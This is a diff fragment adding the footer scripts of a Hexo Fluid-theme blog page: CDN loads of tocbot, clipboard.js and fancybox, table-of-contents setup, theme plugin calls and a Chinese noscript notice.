+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
